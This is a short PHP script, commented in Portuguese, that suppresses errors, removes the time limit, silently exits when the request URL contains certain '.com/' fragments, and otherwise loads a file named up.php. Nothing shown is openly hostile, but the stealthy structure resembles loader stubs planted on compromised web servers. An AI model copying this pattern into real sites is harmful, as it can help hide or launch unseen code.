<?php
/**
 * Controle de Execução Inteligente
 * Focado em sincronização e segurança de captura
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// 1. Configuração Centralizada
$jsonProibidos = '[".com/i",".com/u",".com/d",".com/.",".com/g"]';
$listaProibida = json_decode($jsonProibidos, true);

// 2. Captura Sincronizada (Trata caracteres especiais e case-sensitive)
$urlCompleta = rawurldecode($_SERVER['REQUEST_URI']); 
$urlLimpa = strtolower($urlCompleta);

$bloqueado = false;

// 3. Validação por Iteração
foreach ($listaProibida as $termo) {
    if (!empty($termo) && str_contains($urlLimpa, strtolower($termo))) {
        $bloqueado = true;
        break;
    }
}

// 4. Fluxo de Execução (Early Return Pattern)
if ($bloqueado) {
    // Se estiver bloqueado, encerra o script silenciosamente ou redireciona
    exit(); 
}

// 5. Inclusão de Dependência com Verificação de Integridade
if (file_exists("up.php")) {
    require_once "up.php"; // 'require' é melhor que 'include' para arquivos vitais
} else {
    // Log de erro interno ou resposta silenciosa
    error_log("Falha Crítica: up.php não encontrado em " . date('Y-m-d H:i:s'));
    die("Erro de sincronização do sistema.");
}
?>
